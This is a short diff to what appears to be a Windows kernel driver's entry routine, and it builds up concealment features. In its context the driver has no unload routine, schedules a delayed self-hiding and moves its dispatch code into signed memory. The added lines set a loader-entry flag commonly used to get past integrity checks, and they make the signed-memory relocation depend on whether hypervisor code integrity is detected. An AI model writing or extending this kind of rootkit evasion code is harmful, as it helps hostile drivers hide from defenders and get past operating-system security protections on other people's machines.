@@ -67,6 +67,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
     DriverObject->DriverUnload = nullptr;
 
+    if (DriverObject->DriverSection) {
+        auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
+        ldrEntry->Flags |= 0x20u;
+    }
+
     ClearFlag(deviceObject->Flags, DO_DEVICE_INITIALIZING);
 
 
@@ -79,7 +84,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
     stealth::ScheduleDelayedHide(DriverObject);
 
-    signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
+    if (!hvci_detect::is_hvci_enabled()) {
+        signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
+    }
 
 
     return STATUS_SUCCESS;
